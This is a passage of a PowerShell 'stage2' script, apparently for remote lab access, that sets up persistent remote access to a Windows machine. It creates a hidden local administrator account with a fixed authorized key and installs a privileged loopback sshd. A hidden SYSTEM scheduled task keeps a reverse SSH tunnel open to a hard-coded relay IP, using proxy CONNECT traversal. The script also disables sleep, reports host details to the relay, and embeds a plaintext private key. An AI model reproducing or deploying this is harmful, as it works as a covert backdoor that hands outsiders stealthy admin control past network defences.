#b3-stage2 v1: own loopback sshd + pc_a + SYSTEM tunnel task to the relay; every step is reported to the relay inbox.
param([string]$B3Root = 'C:\ProgramData\b3')
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$common = @'
$Relay = '106.15.130.93'
function Open-B3Tcp([string]$h, [int]$p, [int]$ms) {
    $c = New-Object System.Net.Sockets.TcpClient
    $ar = $c.BeginConnect($h, $p, $null, $null)
    if (-not $ar.AsyncWaitHandle.WaitOne($ms)) { $c.Close(); throw 'timeout' }
    $c.EndConnect($ar)
    return $c
}
function Read-B3Header($stream) {
    $h = New-Object System.Collections.Generic.List[byte]
    while ($true) {
        $b = $stream.ReadByte()
        if ($b -lt 0) { throw 'proxy closed the connection' }
        $h.Add([byte]$b); $n = $h.Count
        if ($n -ge 4 -and $h[$n-4] -eq 13 -and $h[$n-3] -eq 10 -and $h[$n-2] -eq 13 -and $h[$n-1] -eq 10) { break }
        if ($n -gt 16384) { throw 'proxy header too long' }
    }
    return [Text.Encoding]::ASCII.GetString($h.ToArray()).Split("`r")[0]
}
function Test-B3Ssh([int]$port, [string]$proxy) {
    $c = $null
    try {
        if (-not $proxy) { $c = Open-B3Tcp $Relay $port 6000; $s = $c.GetStream() }
        else {
            $u = [uri]$proxy
            $c = Open-B3Tcp $u.Host $u.Port 4000
            $s = $c.GetStream(); $s.ReadTimeout = 8000
            $q = [Text.Encoding]::ASCII.GetBytes(('CONNECT {0}:{1} HTTP/1.1{2}Host: {0}:{1}{2}{2}' -f $Relay, $port, "`r`n"))
            $s.Write($q, 0, $q.Length)
            $first = Read-B3Header $s
            if ($first -notmatch '^HTTP/\S+\s+200') { return ('proxy replied: ' + $first) }
        }
        $s.ReadTimeout = 8000
        $buf = New-Object byte[] 256
        $n = $s.Read($buf, 0, 256)
        $t = [Text.Encoding]::ASCII.GetString($buf, 0, [Math]::Max($n, 0))
        if ($t -match '^SSH-') { return 'OK' }
        return ('not ssh: ' + $t.Substring(0, [Math]::Min(30, $t.Length)))
    } catch {
        $m = $_.Exception.Message
        if ($_.Exception.InnerException) { $m = $_.Exception.InnerException.Message }
        return ('fail: ' + $m)
    } finally { if ($c) { try { $c.Close() } catch {} } }
}
function Get-B3Proxies([string]$root) {
    try { return @((Get-Content -LiteralPath (Join-Path $root 'net.json') -Raw | ConvertFrom-Json).Proxies | Where-Object { $_ -like 'http*' }) } catch { return @() }
}
function Find-B3Routes([string[]]$proxies, [bool]$skipDirect, [bool]$firstOnly) {
    $rows = @(); $good = @()
    if (-not $skipDirect) {
        foreach ($p in @(443, 22, 80, 3389)) {
            $r = Test-B3Ssh $p ''
            $rows += ('direct {0} : {1}' -f $p, $r)
            if ($r -eq 'OK') { $good += [pscustomobject]@{ Port = $p; Proxy = '' }; if ($firstOnly) { break } }
        }
    }
    if (-not ($firstOnly -and $good.Count)) {
        foreach ($px in $proxies) {
            foreach ($p in @(443, 22)) {
                $r = Test-B3Ssh $p $px
                $rows += ('via {0} {1} : {2}' -f $px, $p, $r)
                if ($r -eq 'OK') { $good += [pscustomobject]@{ Port = $p; Proxy = $px }; if ($firstOnly) { break } }
            }
            if ($firstOnly -and $good.Count) { break }
        }
    }
    return [pscustomobject]@{ Rows = $rows; Good = $good }
}
# Runs ssh.exe for one route. For a proxy route ssh connects to a local listener and this function does the
# HTTP CONNECT and copies bytes both ways. TimeoutMs < 0 waits until ssh exits.
function Invoke-B3Ssh([string]$Ssh, [string]$ArgsBase, $Route, [string]$User, [string]$InFile, [string]$OutFile, [string]$ErrFile, [int]$TimeoutMs, [string]$StatusFile) {
    $listener = $null; $pc = $null; $pr = $null; $p = $null
    try {
        if ($Route.Proxy) {
            $listener = New-Object System.Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 0)
            $listener.Start()
            $pending = $listener.BeginAcceptTcpClient($null, $null)
            $argLine = '{0} -p {1} -o HostKeyAlias=b3relay {2}@127.0.0.1' -f $ArgsBase, $listener.LocalEndpoint.Port, $User
        } else {
            $argLine = '{0} -p {1} {2}@{3}' -f $ArgsBase, $Route.Port, $User, $Relay
        }
        $sp = @{ FilePath = $Ssh; ArgumentList = $argLine; NoNewWindow = $true; PassThru = $true }
        if ($InFile) { $sp.RedirectStandardInput = $InFile }
        if ($OutFile) { $sp.RedirectStandardOutput = $OutFile }
        if ($ErrFile) { $sp.RedirectStandardError = $ErrFile }
        $p = Start-Process @sp
        $null = $p.Handle
        if ($listener) {
            if (-not $pending.AsyncWaitHandle.WaitOne(20000)) { throw 'ssh did not connect to the local forwarder' }
            $pc = $listener.EndAcceptTcpClient($pending)
            $u = [uri]$Route.Proxy
            $pr = New-Object System.Net.Sockets.TcpClient($u.Host, $u.Port)
            $ps2 = $pr.GetStream()
            $q = [Text.Encoding]::ASCII.GetBytes(('CONNECT {0}:{1} HTTP/1.1{2}Host: {0}:{1}{2}{2}' -f $Relay, $Route.Port, "`r`n"))
            $ps2.Write($q, 0, $q.Length)
            $first = Read-B3Header $ps2
            if ($first -notmatch '^HTTP/\S+\s+200') { throw ('proxy replied: ' + $first) }
            $cs = $pc.GetStream()
            $null = $cs.CopyToAsync($ps2)
            $null = $ps2.CopyToAsync($cs)
        }
        if ($TimeoutMs -lt 0) {
            # With ExitOnForwardFailure=yes ssh exits at once if login or the remote forward fails,
            # so a process alive for 20 s means the forward is up.
            $sw = [Diagnostics.Stopwatch]::StartNew(); $marked = $false
            while (-not $p.WaitForExit(1000)) {
                if ($StatusFile -and -not $marked -and $sw.Elapsed.TotalSeconds -ge 20) {
                    [IO.File]::WriteAllText($StatusFile, ('up port={0} proxy={1} pid={2} since={3:o}' -f $Route.Port, $Route.Proxy, $p.Id, (Get-Date).AddSeconds(-20)))
                    $marked = $true
                }
            }
            $p.WaitForExit()
            if ($StatusFile) { [IO.File]::WriteAllText($StatusFile, ('down exit={0} at={1:o}' -f $p.ExitCode, (Get-Date))) }
            return $p.ExitCode
        }
        if ($p.WaitForExit($TimeoutMs)) { $p.WaitForExit(); return $p.ExitCode }
        try { $p.Kill() } catch {}
        return 'timeout'
    } finally {
        foreach ($x in @($pc, $pr)) { if ($x) { try { $x.Close() } catch {} } }
        if ($listener) { try { $listener.Stop() } catch {} }
        if ($p -and -not $p.HasExited) { try { $p.Kill() } catch {} }
    }
}
'@
. ([scriptblock]::Create($common))

# ---------------- settings ----------------
$settings = @{ Slot = 3; Tag = 'b3'; SkipDirect = $false }
$sf = Join-Path $B3Root 'settings.json'
if (Test-Path -LiteralPath $sf) { (Get-Content -LiteralPath $sf -Raw | ConvertFrom-Json).psobject.Properties | ForEach-Object { $settings[$_.Name] = $_.Value } }
$Slot = [int]$settings.Slot
$Tag = [string]$settings.Tag
$HostKeyRelay = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuoC4O5MLah2O8KeELpbmQ8UOj0DApoaq7qkzzYKRge'
$ClientKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8pDN8JTObEckxBbP9F7znLZykaf3wlob9MDAsEyPbY pc-a-20261026T071349Z-0078fd21'
$ZipUrl = 'https://github.com/PowerShell/Win32-OpenSSH/releases/download/10.4.0.0p1-Preview/OpenSSH-Win64.zip'
$work = Join-Path $B3Root 'v1'
$bin = 'C:\Program Files\OpenSSH-' + $Tag
$data = 'C:\ProgramData\ssh-' + $Tag
$privateProgramData = Join-Path $data 'service-data'
$svcName = 'sshd-' + $Tag
$taskName = $Tag + '-tunnel'
$utf8 = New-Object System.Text.UTF8Encoding($false)
New-Item -ItemType Directory -Force -Path $work | Out-Null
$log = Join-Path $work 'v1.log'
$steps = New-Object System.Collections.Generic.List[string]
function L([string]$m) {
    $line = '{0:o} [{1}] {2}' -f (Get-Date), $env:USERNAME, $m
    $steps.Add($line)
    try { Add-Content -LiteralPath $log -Encoding UTF8 -Value $line } catch {}
}
function Set-B3Acl([string]$Path, [string]$UserSid, [bool]$Directory, [bool]$AuthUsersRead) {
    if ($Directory) { $acl = New-Object System.Security.AccessControl.DirectorySecurity } else { $acl = New-Object System.Security.AccessControl.FileSecurity }
    $acl.SetAccessRuleProtection($true, $false)
    $sids = @('S-1-5-18', 'S-1-5-32-544'); if ($UserSid) { $sids += $UserSid }
    foreach ($s in $sids) {
        $who = New-Object System.Security.Principal.SecurityIdentifier($s)
        if ($Directory) { $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($who, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow') }
        else { $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($who, 'FullControl', 'Allow') }
        $acl.AddAccessRule($rule)
    }
    if ($AuthUsersRead) {
        $au = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-11')
        if ($Directory) { $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($au, 'ReadAndExecute', 'ContainerInherit,ObjectInherit', 'None', 'Allow') }
        else { $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($au, 'ReadAndExecute', 'Allow') }
        $acl.AddAccessRule($rule)
    }
    $owner = if ($UserSid) { $UserSid } else { 'S-1-5-32-544' }
    $acl.SetOwner((New-Object System.Security.Principal.SecurityIdentifier($owner)))
    Set-Acl -LiteralPath $Path -AclObject $acl
}
function Invoke-Quiet([string]$exe, [string]$argLine) {
    $o = Join-Path $work 'cmd.out'; $e = Join-Path $work 'cmd.err'
    $p = Start-Process -FilePath $exe -ArgumentList $argLine -NoNewWindow -PassThru -RedirectStandardOutput $o -RedirectStandardError $e
    $null = $p.Handle
    if (-not $p.WaitForExit(120000)) { try { $p.Kill() } catch {}; throw "$exe timed out" }
    $p.WaitForExit()
    $text = ((Get-Content -LiteralPath $o -Raw) + (Get-Content -LiteralPath $e -Raw))
    return [pscustomobject]@{ Code = $p.ExitCode; Text = ([string]$text).Trim() }
}

# ---------------- inbox reports ----------------
$inboxKey = Join-Path $work 'inbox_key'
$kh = Join-Path $work 'known_hosts'
$inboxKeyText = @'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDmgz/JyzTEUqQwBY4MzoOHIAxRe+pVYjSKz+PizKpjXwAAAJhS8KmBUvCp
gQAAAAtzc2gtZWQyNTUxOQAAACDmgz/JyzTEUqQwBY4MzoOHIAxRe+pVYjSKz+PizKpjXw
AAAEBQEqXwlY4XNc4pUO9KfygZhFDHe3n4+tpxf0ocgIY/lOaDP8nLNMRSpDAFjgzOg4cg
DFF76lViNIrP4+LMqmNfAAAAD2IzLWluYm94LXB1YmxpYwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
'@
[IO.File]::WriteAllText($inboxKey, (($inboxKeyText -replace "`r`n", "`n").Trim() + "`n"), [Text.Encoding]::ASCII)
Set-B3Acl $inboxKey '' $false $false
$khLines = @("$Relay $HostKeyRelay", "b3relay $HostKeyRelay") + @(@(443, 22, 80, 3389) | ForEach-Object { "[$Relay]:$_ $HostKeyRelay" })
[IO.File]::WriteAllText($kh, (($khLines -join "`n") + "`n"), [Text.Encoding]::ASCII)

$sysSsh = Join-Path $env:SystemRoot 'System32\OpenSSH\ssh.exe'
$script:routes = @()
function Send-Inbox([string]$kind, [string]$body) {
    $ssh = if (Test-Path -LiteralPath (Join-Path $bin 'ssh.exe')) { Join-Path $bin 'ssh.exe' } else { $sysSsh }
    $in = Join-Path $work 'inbox.txt'; $out = Join-Path $work 'inbox.out'; $err = Join-Path $work 'inbox.err'
    $text = "b3 v1 $kind  slot=$Slot computer=$env:COMPUTERNAME user=$env:USERDOMAIN\$env:USERNAME time=$((Get-Date).ToString('o'))`n$body`n--- steps`n" + ($steps -join "`n")
    [IO.File]::WriteAllText($in, $text, $utf8)
    $base = '-F NUL -T -i "{0}" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=yes -o "UserKnownHostsFile={1}" -o GlobalKnownHostsFile=NUL -o ConnectTimeout=20' -f $inboxKey, $kh
    foreach ($r in $script:routes) {
        try {
            $code = Invoke-B3Ssh $ssh $base $r 'b3-inbox' $in $out $err 90000
            $o = ''; foreach ($f in @($out, $err)) { if (Test-Path -LiteralPath $f) { $o += [string](Get-Content -LiteralPath $f -Raw) } }
            if ($code -eq 0 -and $o -match 'stored') { return $true }
            try { Add-Content -LiteralPath $log -Value "inbox send via port=$($r.Port) proxy=$($r.Proxy) exit=$code $($o.Trim())" } catch {}
        } catch { try { Add-Content -LiteralPath $log -Value "inbox send error: $($_.Exception.Message)" } catch {} }
    }
    return $false
}
function Get-Tail([string]$path, [int]$n) {
    try {
        if (-not (Test-Path -LiteralPath $path)) { return '' }
        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite,Delete')
        try { $t = (New-Object IO.StreamReader($fs)).ReadToEnd() } finally { $fs.Dispose() }
        return ((($t -split "`r?`n") | Select-Object -Last $n) -join "`n")
    } catch { return "(cannot read $path while in use)" }
}

$step = 'start'
try {
    L ("v1 start slot=$Slot tag=$Tag root=$B3Root")
    # ---------------- route ----------------
    $step = 'route'
    $proxies = Get-B3Proxies $B3Root
    $found = Find-B3Routes $proxies ([bool]$settings.SkipDirect) $false
    $found.Rows | ForEach-Object { L $_ }
    $script:routes = @($found.Good)
    if (-not $script:routes.Count) { throw 'no route to the relay' }
    L ('route chosen: port={0} proxy={1}' -f $script:routes[0].Port, $script:routes[0].Proxy)

    # ---------------- OpenSSH binaries ----------------
    $step = 'openssh'
    $sshd = Join-Path $bin 'sshd.exe'
    if (-not (Test-Path -LiteralPath $sshd)) {
        $zip = Join-Path $work 'OpenSSH-Win64.zip'
        $ok = $false
        foreach ($r in @('SYSTEM', 'DIRECT') + $proxies) {
            try {
                $wc = New-Object System.Net.WebClient
                if ($r -eq 'DIRECT') { $wc.Proxy = $null } elseif ($r -ne 'SYSTEM') { $wc.Proxy = New-Object System.Net.WebProxy($r) }
                $wc.DownloadFile($ZipUrl, $zip); $ok = $true; L "openssh zip downloaded via $r"; break
            } catch { L "openssh zip via $r failed: $($_.Exception.Message)" }
        }
        if (-not $ok) { throw 'cannot download OpenSSH-Win64.zip' }
        L ('openssh zip sha256 ' + (Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash)
        $unz = Join-Path $work 'openssh-unzip'
        if (Test-Path -LiteralPath $unz) { Remove-Item -LiteralPath $unz -Recurse -Force }
        Expand-Archive -LiteralPath $zip -DestinationPath $unz -Force
        New-Item -ItemType Directory -Force -Path $bin | Out-Null
        Copy-Item -Path (Join-Path $unz 'OpenSSH-Win64\*') -Destination $bin -Recurse -Force
        Remove-Item -LiteralPath $unz -Recurse -Force
        Remove-Item -LiteralPath $zip -Force
    }
    Set-B3Acl $bin '' $true $true
    Get-ChildItem -LiteralPath $bin -Recurse -Force | ForEach-Object { $a = Get-Acl -LiteralPath $_.FullName; $a.SetOwner((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544'))); Set-Acl -LiteralPath $_.FullName -AclObject $a }
    $v = Invoke-Quiet $sshd '-V'
    L ('sshd version: ' + $v.Text)
    if ($v.Text -notmatch 'OpenSSH_for_Windows_10\.4') { throw ('unexpected sshd version: ' + $v.Text) }
    if (-not (Test-Path -LiteralPath 'HKLM:\SOFTWARE\OpenSSH')) { New-Item -Path 'HKLM:\SOFTWARE\OpenSSH' -Force | Out-Null; L 'created HKLM\SOFTWARE\OpenSSH' }

    # ---------------- data dir and host key ----------------
    $step = 'hostkey'
    foreach ($d in @($data, $privateProgramData, (Join-Path $privateProgramData 'ssh'), (Join-Path $privateProgramData 'ssh\logs'))) {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
        Set-B3Acl $d '' $true $true
    }
    $hk = Join-Path $data 'ssh_host_ed25519_key'
    if (-not (Test-Path -LiteralPath $hk)) {
        $g = Invoke-Quiet (Join-Path $bin 'ssh-keygen.exe') ('-q -t ed25519 -N "" -f "{0}"' -f $hk)
        if ($g.Code -ne 0) { throw ('host key generation failed: ' + $g.Text) }
    }
    Set-B3Acl $hk '' $false $false
    Set-B3Acl ($hk + '.pub') '' $false $true
    $hostPub = ([IO.File]::ReadAllText($hk + '.pub').Trim() -split '\s+')[0..1] -join ' '
    L ('sshd host key: ' + $hostPub)

    # ---------------- pc_a ----------------
    $step = 'pc_a'
    $account = Get-LocalUser -Name 'pc_a' -ErrorAction SilentlyContinue
    if (-not $account) {
        $bytes = New-Object byte[] 48
        $rng = [Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); $rng.Dispose()
        $secure = New-Object Security.SecureString
        foreach ($ch in ('aA1!' + [Convert]::ToBase64String($bytes)).ToCharArray()) { $secure.AppendChar($ch) }
        $secure.MakeReadOnly()
        $account = New-LocalUser -Name 'pc_a' -Password $secure -PasswordNeverExpires -AccountNeverExpires -UserMayNotChangePassword -Description 'blue lab remote user'
        L 'created pc_a'
    } else { Enable-LocalUser -Name 'pc_a'; Set-LocalUser -Name 'pc_a' -PasswordNeverExpires $true -AccountNeverExpires }
    $account = Get-LocalUser -Name 'pc_a'
    $userSid = $account.SID.Value
    $admins = Get-LocalGroup -SID 'S-1-5-32-544'
    if (-not @(Get-LocalGroupMember -Group $admins | Where-Object { $_.SID.Value -eq $userSid }).Count) { Add-LocalGroupMember -Group $admins -Member $account; L 'pc_a added to Administrators' }
    $plKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\' + $userSid
    $profilePath = $null
    $pl = Get-ItemProperty -LiteralPath $plKey -ErrorAction SilentlyContinue
    if ($pl -and $pl.ProfileImagePath) { $profilePath = [Environment]::ExpandEnvironmentVariables($pl.ProfileImagePath) }
    if (-not $profilePath) {
        $bakKey = $plKey + '.bak'
        if (Test-Path -LiteralPath $bakKey) {
            $oldDir = [Environment]::ExpandEnvironmentVariables([string](Get-ItemProperty -LiteralPath $bakKey).ProfileImagePath)
            & reg.exe export ('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\' + $userSid + '.bak') (Join-Path $work ('profilelist-bak-' + (Get-Date -Format yyyyMMddHHmmss) + '.reg')) /y | Out-Null
            if ($oldDir -and (Test-Path -LiteralPath $oldDir)) { Rename-Item -LiteralPath $oldDir -NewName ((Split-Path $oldDir -Leaf) + '.b3-old-' + (Get-Date -Format yyyyMMddHHmmss)) }
            Remove-Item -LiteralPath $bakKey -Recurse -Force
            L 'removed stale pc_a ProfileList .bak entry'
        }
        if (-not ('B3Profile' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Text;
using System.Runtime.InteropServices;
public static class B3Profile {
    [DllImport("userenv.dll", CharSet=CharSet.Unicode)]
    public static extern int CreateProfile(string sid, string name, StringBuilder path, uint length);
}
'@
        }
        $buffer = New-Object Text.StringBuilder 260
        $hr = [B3Profile]::CreateProfile($userSid, 'pc_a', $buffer, [uint32]$buffer.Capacity)
        if ($hr -ne 0) { throw ('CreateProfile failed HRESULT=' + $hr) }
        $pl = Get-ItemProperty -LiteralPath $plKey -ErrorAction SilentlyContinue
        $profilePath = [Environment]::ExpandEnvironmentVariables($pl.ProfileImagePath)
        L ('created pc_a profile ' + $profilePath)
    }
    $sshDir = Join-Path $profilePath '.ssh'
    New-Item -ItemType Directory -Force -Path $sshDir | Out-Null
    Set-B3Acl $sshDir $userSid $true $false
    $ak = Join-Path $sshDir 'authorized_keys'
    $keys = @(); if (Test-Path -LiteralPath $ak) { $keys = @(Get-Content -LiteralPath $ak) }
    if ($keys -notcontains $ClientKey) { $keys += $ClientKey; [IO.File]::WriteAllLines($ak, [string[]]$keys, $utf8); L 'client key added to pc_a authorized_keys' }
    Set-B3Acl $ak $userSid $false $false
    $wr = 'C:\clients\pc-a'
    if (-not (Test-Path -LiteralPath $wr)) { New-Item -ItemType Directory -Force -Path $wr | Out-Null; Set-B3Acl $wr $userSid $true $false; L 'created C:\clients\pc-a' }
    foreach ($n in @('repos', 'jobs', 'logs', 'cache', 'tmp', 'tools', 'state')) { New-Item -ItemType Directory -Force -Path (Join-Path $wr $n) | Out-Null }

    # ---------------- sshd service ----------------
    $step = 'sshd'
    $config = Join-Path $data 'sshd_config'
    $statePath = Join-Path $work 'state.json'
    $state = @{}
    if (Test-Path -LiteralPath $statePath) { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).psobject.Properties | ForEach-Object { $state[$_.Name] = $_.Value } }
    $svc = Get-CimInstance Win32_Service -Filter ("Name='{0}'" -f $svcName)
    if (-not $state.SshdPort) {
        $port = 2222
        while (@(Get-NetTCPConnection -State Listen -LocalPort $port -ErrorAction SilentlyContinue).Count) { $port++ }
        $state.SshdPort = $port
        ($state | ConvertTo-Json) | Set-Content -LiteralPath $statePath -Encoding UTF8
    }
    $sshdPort = [int]$state.SshdPort
    $body = @"
# b3 own loopback sshd ($Tag)
Port $sshdPort
ListenAddress 127.0.0.1
HostKey $($hk.Replace('\', '/'))
PubkeyAuthentication yes
PasswordAuthentication no
KbdInteractiveAuthentication no
AuthenticationMethods publickey
AuthorizedKeysFile .ssh/authorized_keys
AllowUsers pc_a
AllowTcpForwarding yes
GatewayPorts no
SyslogFacility LOCAL0
Subsystem sftp "$($bin.Replace('\', '/'))/sftp-server.exe"
"@
    $body = $body -replace "`r`n", "`n"
    if (-not (Test-Path -LiteralPath $config) -or [IO.File]::ReadAllText($config) -ne $body) {
        if ($svc -and $svc.State -eq 'Running') { Stop-Service -Name $svcName -Force }
        [IO.File]::WriteAllText($config, $body, $utf8)
        L "sshd_config written (port $sshdPort)"
    }
    Set-B3Acl $config '' $false $true
    $t = Invoke-Quiet $sshd ('-t -f "{0}"' -f $config)
    if ($t.Code -ne 0) { throw ('sshd -t failed: ' + $t.Text) }
    $cmd = '"{0}" -f "{1}"' -f $sshd, $config
    if (-not $svc) { New-Service -Name $svcName -DisplayName ('Blue lab own OpenSSH (' + $Tag + ')') -BinaryPathName $cmd -StartupType Automatic | Out-Null; L "service $svcName created" }
    elseif ($svc.PathName -ne $cmd) { throw "$svcName exists with another command: $($svc.PathName)" }
    Set-Service -Name $svcName -StartupType Automatic
    $reg = 'HKLM:\SYSTEM\CurrentControlSet\Services\' + $svcName
    $envWanted = @('ProgramData=' + $privateProgramData)
    $envNow = @((Get-Item -LiteralPath $reg).GetValue('Environment', [string[]]@()))
    if (($envNow -join "`n") -cne ($envWanted -join "`n")) {
        if ((Get-Service -Name $svcName).Status -eq 'Running') { Stop-Service -Name $svcName -Force }
        New-ItemProperty -LiteralPath $reg -Name Environment -PropertyType MultiString -Value ([string[]]$envWanted) -Force | Out-Null
    }
    $pv = Invoke-Quiet 'sc.exe' ('privs {0} SeAssignPrimaryTokenPrivilege/SeTcbPrivilege/SeBackupPrivilege/SeRestorePrivilege/SeImpersonatePrivilege' -f $svcName)
    if ($pv.Code -ne 0) { throw ('sc privs failed: ' + $pv.Text) }
    if ((Get-Service -Name $svcName).Status -ne 'Running') { Start-Service -Name $svcName }
    $sw = [Diagnostics.Stopwatch]::StartNew(); $listening = $false
    while ($sw.Elapsed.TotalSeconds -lt 30) {
        $s = Get-CimInstance Win32_Service -Filter ("Name='{0}'" -f $svcName)
        $l = @(Get-NetTCPConnection -State Listen -LocalPort $sshdPort -ErrorAction SilentlyContinue | Where-Object { $_.OwningProcess -eq $s.ProcessId })
        if ($s.State -eq 'Running' -and $l.Count -and $l[0].LocalAddress -eq '127.0.0.1') { $listening = $true; break }
        Start-Sleep -Milliseconds 500
    }
    if (-not $listening) { throw "$svcName is not listening on 127.0.0.1:$sshdPort" }
    L "sshd $svcName listening on 127.0.0.1:$sshdPort"

    # ---------------- tunnel key and registration ----------------
    $step = 'register'
    $tk = Join-Path $work 'tunnel_key'
    if (-not (Test-Path -LiteralPath $tk)) {
        $g = Invoke-Quiet (Join-Path $bin 'ssh-keygen.exe') ('-q -t ed25519 -N "" -C b3-slot{0}-{1} -f "{2}"' -f $Slot, $env:COMPUTERNAME, $tk)
        if ($g.Code -ne 0) { throw ('tunnel key generation failed: ' + $g.Text) }
        L 'tunnel key generated'
    }
    Set-B3Acl $tk '' $false $false
    $tunnelPub = ([IO.File]::ReadAllText($tk + '.pub').Trim() -split '\s+')[0..1] -join ' '
    $reg = "b3-register v1`nslot=$Slot`ncomputer=$env:COMPUTERNAME`ntunnel_pub=$tunnelPub`nhost_pub=$hostPub`nsshd_port=$sshdPort`nroute=port $($script:routes[0].Port) proxy $($script:routes[0].Proxy)"
    if (-not (Send-Inbox 'register' $reg)) { throw 'could not deliver the registration to the relay inbox' }
    L 'registration delivered'

    # ---------------- tunnel task ----------------
    $step = 'tunnel'
    [IO.File]::WriteAllText((Join-Path $work 'b3common.ps1'), $common, $utf8)
    $tcfg = [ordered]@{ Root = $B3Root; Slot = $Slot; SshdPort = $sshdPort; Key = $tk; KnownHosts = $kh; Ssh = (Join-Path $bin 'ssh.exe'); SkipDirect = [bool]$settings.SkipDirect }
    $tcfgPath = Join-Path $work 'tunnel.json'
    ($tcfg | ConvertTo-Json) | Set-Content -LiteralPath $tcfgPath -Encoding UTF8
    $tunnelPs = @'
param([string]$Config)
$ErrorActionPreference = 'Continue'
$dir = Split-Path -Parent $Config
. ([scriptblock]::Create([IO.File]::ReadAllText((Join-Path $dir 'b3common.ps1'))))
$log = Join-Path $dir 'tunnel.log'
$sshLog = Join-Path $dir 'tunnel-ssh.log'
function TL([string]$m) {
    try {
        if ((Test-Path -LiteralPath $log) -and (Get-Item -LiteralPath $log).Length -gt 1MB) { Move-Item -LiteralPath $log -Destination ($log + '.previous') -Force }
        Add-Content -LiteralPath $log -Encoding UTF8 -Value ('{0:o} {1}' -f (Get-Date), $m)
    } catch {}
}
while ($true) {
    try {
        $cfg = Get-Content -LiteralPath $Config -Raw | ConvertFrom-Json
        $found = Find-B3Routes (Get-B3Proxies $cfg.Root) ([bool]$cfg.SkipDirect) $true
        if (-not $found.Good.Count) { TL ('no route: ' + ($found.Rows -join '; ')) }
        else {
            $r = $found.Good[0]
            if ((Test-Path -LiteralPath $sshLog) -and (Get-Item -LiteralPath $sshLog).Length -gt 2MB) { Move-Item -LiteralPath $sshLog -Destination ($sshLog + '.previous') -Force }
            $base = '-N -T -n -v -E "{0}" -F NUL -i "{1}" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=yes -o "UserKnownHostsFile={2}" -o GlobalKnownHostsFile=NUL -o ExitOnForwardFailure=yes -o ConnectTimeout=15 -o ServerAliveInterval=15 -o ServerAliveCountMax=3 -R 127.0.0.1:220{3}:127.0.0.1:{4}' -f $sshLog, $cfg.Key, $cfg.KnownHosts, $cfg.Slot, $cfg.SshdPort
            TL ('connect port={0} proxy={1}' -f $r.Port, $r.Proxy)
            $code = Invoke-B3Ssh $cfg.Ssh $base $r ('tunnel-slot' + $cfg.Slot) '' '' '' -1 (Join-Path $dir 'tunnel-status.txt')
            TL ('ssh exit ' + $code)
        }
    } catch { TL ('error: ' + $_.Exception.Message) }
    Start-Sleep -Seconds 10
}
'@
    $tunnelPath = Join-Path $work 'tunnel.ps1'
    [IO.File]::WriteAllText($tunnelPath, $tunnelPs, (New-Object System.Text.UTF8Encoding($true)))
    foreach ($f in @($tunnelPath, (Join-Path $work 'b3common.ps1'), $tcfgPath)) { Set-B3Acl $f '' $false $true }
    # restart the tunnel with the current files
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) { Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue }
    Get-CimInstance Win32_Process -Filter "Name='ssh.exe'" | Where-Object { $_.CommandLine -and $_.CommandLine.Contains($tk) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    $ps = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $act = New-ScheduledTaskAction -Execute $ps -Argument ('-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}" -Config "{1}"' -f $tunnelPath, $tcfgPath)
    $trig = @((New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)))
    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -Hidden
    $pri = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $statusFile = Join-Path $work 'tunnel-status.txt'
    if (Test-Path -LiteralPath $statusFile) { Remove-Item -LiteralPath $statusFile -Force }
    Register-ScheduledTask -TaskName $taskName -Action $act -Trigger $trig -Principal $pri -Settings $set -Force | Out-Null
    Start-ScheduledTask -TaskName $taskName
    L "tunnel task $taskName started"
    foreach ($kv in @(@('standby-timeout-ac', 0), @('hibernate-timeout-ac', 0))) { & powercfg.exe /change $kv[0] $kv[1] | Out-Null }

    # ---------------- wait for the remote forward ----------------
    $step = 'verify'
    $sw = [Diagnostics.Stopwatch]::StartNew(); $up = $false
    while ($sw.Elapsed.TotalSeconds -lt 300) {
        Start-Sleep -Seconds 3
        $st = ''
        try { if (Test-Path -LiteralPath $statusFile) { $st = [IO.File]::ReadAllText($statusFile) } } catch {}
        if ($st -like 'up *') { $up = $true; L ('tunnel status: ' + $st); break }
    }
    if (-not $up) { throw 'tunnel did not report remote forward success within 300 s' }
    L ('tunnel up after {0:N0} s' -f $sw.Elapsed.TotalSeconds)
    $done = "result=done`nsshd_port=$sshdPort`nhost_pub=$hostPub`n--- tunnel.log`n" + (Get-Tail (Join-Path $work 'tunnel.log') 10)
